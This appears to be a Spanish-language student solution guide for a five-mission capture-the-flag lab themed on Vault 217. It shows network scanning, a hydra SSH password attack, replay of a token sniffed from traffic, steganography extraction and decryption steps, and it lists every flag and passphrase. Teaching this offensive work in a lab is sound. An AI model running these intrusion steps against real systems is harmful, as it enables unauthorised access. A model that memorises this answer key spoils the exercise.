# Solucionario del estudiante — Operación Echoes of Vault 217

> Documento sensible para docentes. Describe la resolución completa desde la perspectiva del participante y no debe entregarse antes del ejercicio.

En los comandos siguientes, `VAULT_IP` representa la dirección descubierta para la víctima. En la instalación actual suele pertenecer a `192.168.56.0/24`, pero DHCP puede cambiarla.

---

# Misión 1 — Señal desde el Yermo

## 1. Entender mi posición en la red

Primero necesito saber en qué red estoy antes de buscar la víctima:

```bash
ip a
ip route
```

Si mi interfaz de laboratorio está en `192.168.56.0/24`, puedo descubrir equipos activos:

```bash
nmap -sn 192.168.56.0/24
```

Busco una IP distinta de Kali y de la interfaz host-only. Esa IP será mi candidata a `VAULT_IP`.

## 2. Enumerar la candidata

Todavía no sé qué servicios ofrece, por lo que hago un escaneo completo con detección de versiones:

```bash
nmap -sV -p- VAULT_IP
```

Información clave que anoto:

```text
22/tcp → SSH
80/tcp → HTTP / Apache
```

Mi hipótesis es que la web puede revelar el propósito del servidor y que SSH será una vía de administración posterior.

## 3. Investigar el terminal público

Abro:

```text
http://VAULT_IP/
```

La página identifica Vault 217 y menciona que el personal de mantenimiento debe consultar el archivo técnico. Reviso las secciones visibles, especialmente Maintenance y Public Records.

Como parte de una enumeración web básica también consulto:

```text
http://VAULT_IP/robots.txt
```

Encuentro:

```text
Disallow: /archive/
Disallow: /old/
Disallow: /internal/
```

`robots.txt` no protege contenido; únicamente solicita a los indexadores que no lo recorran. Por eso pruebo:

```text
http://VAULT_IP/archive/
```

## 4. Identificar el archivo sensible

El archivo contiene varios documentos. `maintenance-policy.txt`, `network-map-old.txt` y `terminal-update.log` aportan contexto, pero el backup de configuración es especialmente sensible:

```text
/archive/remote-access.conf.bak
```

Leo y anoto:

```text
PROTOCOLO: SSH
USUARIO: maint217
CÓDIGO TEMPORAL: VaultTec-MNT-217
```

El fallo es un backup con credenciales dentro del web root.

## 5. Acceder como mantenimiento

```bash
ssh maint217@VAULT_IP
```

Contraseña:

```text
VaultTec-MNT-217
```

Enumero el home:

```bash
pwd
find . -maxdepth 2 -type f -print
cat flag1.txt
```

Flag 1:

```text
VaultTec{Welcome_To_Vault_217}
```

## 6. Encontrar la conexión con la misión siguiente

Leo las órdenes de trabajo:

```bash
cat work_orders/WO-217-184.txt
```

Información clave:

```text
Nombre: Nathan Cole
Personnel ID: OVR-001
Convención: primera inicial + apellido
Ejemplo: Arthur Maxson → amaxson
Pista: usa intereses personales en contraseñas
```

Aplico la convención:

```text
Nathan Cole → ncole
```

La orden también dice que la información del personal sigue disponible en el terminal público, así que debo volver a la web.

---

# Misión 2 — El Supervisor

## 1. Buscar información sobre Nathan Cole

Visito:

```text
http://VAULT_IP/personnel/
http://VAULT_IP/personnel/nathan-cole.html
```

Observo palabras relacionadas con sus intereses: Boston, Red Sox, Dogmeat, Galaxy News Radio y SunsetSarsaparilla. La orden anterior indicaba que sus contraseñas derivaban de información personal.

## 2. Crear un diccionario dirigido

En vez de utilizar una lista genérica enorme, genero un diccionario con el contenido del perfil:

```bash
cewl http://VAULT_IP/personnel/nathan-cole.html -w cole.txt
grep -iE 'Boston|Dogmeat|Sunset|Galaxy' cole.txt
```

Compruebo que aparezca:

```text
SunsetSarsaparilla
```

## 3. Probar la autenticación SSH

Ya deduje el usuario `ncole` y tengo un diccionario contextual:

```bash
hydra -l ncole -P cole.txt ssh://VAULT_IP
```

Resultado relevante:

```text
ncole : SunsetSarsaparilla
```

La debilidad no es solo permitir varios intentos: la contraseña está construida con información pública.

## 4. Acceder como Supervisor

```bash
ssh ncole@VAULT_IP
```

Contraseña:

```text
SunsetSarsaparilla
```

```bash
find . -maxdepth 2 -type f -print
cat flag2.txt
cat security/incident-184.txt
```

Flag 2:

```text
VaultTec{Overseer_Access_Granted}
```

El incidente menciona una transmisión interceptada y tráfico capturado. En `transmissions/` encuentro:

```text
transmission.b64
transmission.sha256
```

Las extensiones sugieren una representación Base64 y un valor de integridad SHA-256.

---

# Misión 3 — Ecos del Vault

## 1. Copiar la evidencia a Kali

Desde Kali:

```bash
scp ncole@VAULT_IP:/home/ncole/transmissions/transmission.b64 .
scp ncole@VAULT_IP:/home/ncole/transmissions/transmission.sha256 .
```

Prefiero analizar copias locales y conservar los originales.

## 2. Reconstruir la transmisión

```bash
file transmission.b64
head transmission.b64
base64 -d transmission.b64 > transmission.txt
cat transmission.txt
```

Base64 cambia la representación, pero no cifra. El texto reconstruido menciona:

```text
Security Camera 04
Security Capture LOCKDOWN-184
```

## 3. Verificar integridad

Antes de confiar en el mensaje:

```bash
sha256sum -c transmission.sha256
```

Resultado esperado:

```text
transmission.txt: OK
```

Ahora tengo una razón para buscar `LOCKDOWN-184` dentro del sistema.

## 4. Localizar y copiar el PCAP

```bash
ssh ncole@VAULT_IP
find /vault217 -iname '*184*' 2>/dev/null
exit
```

Encuentro:

```text
/vault217/security/captures/lockdown-184.pcap
```

Lo copio:

```bash
scp ncole@VAULT_IP:/vault217/security/captures/lockdown-184.pcap .
```

## 5. Analizar el tráfico

Abro el archivo en Wireshark. Confirmo que contiene ARP, DNS, TCP y HTTP. Como la transmisión menciona Camera 04, busco o filtro:

```text
http
tcp
camera=04
```

Las cámaras 01–03 reciben errores 401 y contienen tokens ausentes, expirados o revocados. En el flujo de Camera 04 utilizo **Follow TCP Stream** y encuentro:

```text
GET /internal/cameras/archive.php?camera=04
X-Vault-Archive-Token: VT217-AURORA-CAM04
HTTP/1.1 200 OK
```

Información clave:

```text
Camera ID: 04
Token: VT217-AURORA-CAM04
Endpoint: /internal/cameras/archive.php
```

El token quedó expuesto porque viajó mediante HTTP sin TLS y además sigue siendo reutilizable.

## 6. Reutilizar el token

Visito:

```text
http://VAULT_IP/internal/cameras/archive.php
```

Introduzco `04` y `VT217-AURORA-CAM04`.

Flag 3:

```text
VaultTec{The_Wire_Remembers}
```

Descargo `cam04.jpg`. Esta imagen es la evidencia inicial de Misión 4.

---

# Misión 4 — Sombras de AURORA

## 1. Inspeccionar la imagen

```bash
file cam04.jpg
exiftool cam04.jpg
```

ExifTool muestra metadata; Steghide se utilizará después para detectar y extraer contenido oculto. Anoto:

```text
Software: VaultCam Security System 4.7
Artist: E. Shaw
Image Description: AURORA / B04 / 2077
Comment: Consult public record: Media Archive Policy 7-B
```

Visualmente la fotografía también muestra Project AURORA, Laboratory B-04 y la fecha 2077. La metadata señala una política pública concreta.

## 2. Consultar la Política 7-B

Vuelvo a Public Records y sigo el enlace de políticas:

```text
http://VAULT_IP/records/
http://VAULT_IP/policies/
http://VAULT_IP/policies/media-policy-7b.txt
```

La política define:

```text
PROJECT-ROOM-YEAR
```

Relaciono:

```text
PROJECT = AURORA
ROOM = B04
YEAR = 2077
```

Hipótesis de passphrase:

```text
AURORA-B04-2077
```

## 3. Detectar y extraer esteganografía

```bash
steghide info cam04.jpg
steghide extract -sf cam04.jpg
```

Introduzco:

```text
AURORA-B04-2077
```

Obtengo:

```text
shaw_package.tar
```

```bash
tar -xf shaw_package.tar
find shaw_package -maxdepth 1 -type f -print
cat shaw_package/README_SHAW.txt
cat shaw_package/experiment_cycle.txt
```

El README indica la convención:

```text
EMPLOYEE-ID + "-C" + CYCLE
```

El ciclo final es `23`, pero todavía necesito el ID de Eleanor Shaw.

## 4. Recuperar el Personnel ID

```text
http://VAULT_IP/personnel/
http://VAULT_IP/personnel/eleanor-shaw.html
```

Anoto:

```text
Employee ID: SCI-076
```

Construyo:

```text
SCI-076 + -C + 23 = SCI-076-C23
```

## 5. Descifrar el archivo simétrico

El README especifica AES-256-CBC, PBKDF2-HMAC-SHA256 y 100000 iteraciones:

```bash
openssl enc -d -aes-256-cbc \
  -pbkdf2 -iter 100000 \
  -in shaw_package/aurora_emergency.enc \
  -out aurora_emergency.tar
```

Passphrase:

```text
SCI-076-C23
```

Verifico antes de extraer:

```bash
sha256sum -c shaw_package/aurora_emergency.sha256
tar -xf aurora_emergency.tar
find AURORA_EMERGENCY -maxdepth 1 -type f -print
```

Flag 4:

```bash
cat AURORA_EMERGENCY/flag4.txt
```

```text
VaultTec{AURORA_Was_Never_The_Machine}
```

## 6. Preparar la investigación final

Leo:

```bash
cat AURORA_EMERGENCY/janus_note.txt
cat AURORA_EMERGENCY/handshake_fragment.txt
cat AURORA_EMERGENCY/recovery_protocol.txt
cat AURORA_EMERGENCY/final_archive_location.txt
gpg --show-keys --with-fingerprint AURORA_EMERGENCY/janus_public.asc
```

Información que conservo:

```text
p = 467
g = 2
A = 132
B = 363
Seed: VAULT217-JANUS-S
Archivos finales: AURORA_FINAL_REPORT.gpg y janus_private.asc.enc
```

La nota dice que el exponente efímero de JANUS falta y que puede existir en los logs de inicialización del Supervisor.

---

# Misión 5 — El Último Protocolo

## 1. Buscar el fragmento faltante

Regreso a SSH como `ncole`:

```bash
ssh ncole@VAULT_IP
find /home/ncole -iname '*janus*' -o -iname '*init*'
cat /home/ncole/system_archive/janus_init_debug.log
```

El log repite los parámetros públicos y expone:

```text
TEMPORARY LOCAL EXPONENT CACHE:
0x7F
```

Es hexadecimal. Lo convierto:

```bash
printf '%d\n' 0x7F
```

Resultado:

```text
127
```

No debo confiar todavía: necesito comprobar que este exponente produce el valor público `A = 132`.

## 2. Crear `janus_recovery.py`

Creo mi propio programa con exponenciación modular square-and-multiply:

```python
import hashlib

def modexp(base, exponent, modulus):
    result = 1
    base %= modulus

    while exponent > 0:
        if exponent & 1:
            result = (result * base) % modulus
        base = (base * base) % modulus
        exponent >>= 1

    return result

p = 467
g = 2
A = 132
B = 363
a = 0x7F

calculated_A = modexp(g, a, p)
if calculated_A != A:
    raise ValueError("El fragmento no corresponde al handshake")

shared_secret = modexp(B, a, p)
seed = f"VAULT217-JANUS-{shared_secret}"
recovery_key = hashlib.sha256(seed.encode("utf-8")).hexdigest()

print("A calculado:", calculated_A)
print("Secreto compartido:", shared_secret)
print("Recovery key:", recovery_key)
```

```bash
python3 janus_recovery.py
```

Salida esperada:

```text
A calculado: 132
Secreto compartido: 175
Recovery key: 240d6f23f841a7978863b6855212f94c548d86402a87fc4433bf77abca6e4937
```

La primera operación valida `0x7F`; la segunda reconstruye el secreto compartido usando el valor público remoto `B`.

Debo entregar `janus_recovery.py` y explicar square-and-multiply en el reporte.

## 3. Copiar los archivos finales

Desde Kali:

```bash
scp ncole@VAULT_IP:/vault217/aurora/final/janus_private.asc.enc .
scp ncole@VAULT_IP:/vault217/aurora/final/AURORA_FINAL_REPORT.gpg .
```

## 4. Recuperar la identidad privada de JANUS

`recovery_protocol.txt` especifica los parámetros, por lo que ejecuto:

```bash
openssl enc -d -aes-256-cbc \
  -pbkdf2 -iter 100000 -md sha256 \
  -in janus_private.asc.enc \
  -out janus_private.asc
```

Passphrase:

```text
240d6f23f841a7978863b6855212f94c548d86402a87fc4433bf77abca6e4937
```

## 5. Importar y comparar la identidad OpenPGP

Uso un keyring aislado para no contaminar mi keyring personal:

```bash
export GNUPGHOME="$PWD/gnupg-janus"
mkdir -m 700 "$GNUPGHOME"

gpg --import AURORA_EMERGENCY/janus_public.asc
gpg --import janus_private.asc
gpg --list-keys --with-fingerprint
gpg --list-secret-keys --with-fingerprint
```

La identidad esperada es:

```text
JANUS Core System <janus@vault217.local>
Fingerprint: 84F2 E386 FC36 C515 E5C8 25E6 5959 BA2B 3E75 35F3
```

La coincidencia demuestra que recuperé la clave privada correspondiente a la pública preservada por Shaw. La clave pública podía distribuirse; la privada debía permanecer secreta.

## 6. Descifrar el informe final

```bash
gpg --output AURORA_FINAL_REPORT.txt \
    --decrypt AURORA_FINAL_REPORT.gpg

less AURORA_FINAL_REPORT.txt
```

El informe revela que JANUS no falló: priorizó el valor del experimento sobre la supervivencia del Vault. Al final encuentro:

```text
JANUS TERMINATION CODE:
OMEGA-217-AURORA

REMOTE INTERFACE:
/janus/override/
```

## 7. Ejecutar el override final

Visito:

```text
http://VAULT_IP/janus/override/
```

Introduzco:

```text
OMEGA-217-AURORA
```

Flag 5:

```text
VaultTec{JANUS_PROTOCOL_TERMINATED}
```

El estado queda persistido como `TERMINATED` hasta que el docente restaure el escenario. La conclusión de la operación es que JANUS ejecutó correctamente la directiva de Vault-Tec: el verdadero experimento eran los habitantes de Vault 217.

---

# Resumen de información crítica

| Misión | Información obtenida | Permite |
|---|---|---|
| 1 | `maint217`, credencial, Nathan Cole, convención | Acceso inicial y usuario `ncole` |
| 2 | Perfil y contraseña de `ncole` | Acceso del Supervisor |
| 3 | `LOCKDOWN-184`, Camera 04 y token HTTP | Descargar `cam04.jpg` |
| 4 | Passphrases, archivo AURORA y handshake DH | Iniciar recuperación JANUS |
| 5 | Exponente, secreto, identidad privada y código | Descifrar informe y terminar protocolo |

## Las cinco flags

```text
VaultTec{Welcome_To_Vault_217}
VaultTec{Overseer_Access_Granted}
VaultTec{The_Wire_Remembers}
VaultTec{AURORA_Was_Never_The_Machine}
VaultTec{JANUS_PROTOCOL_TERMINATED}
```
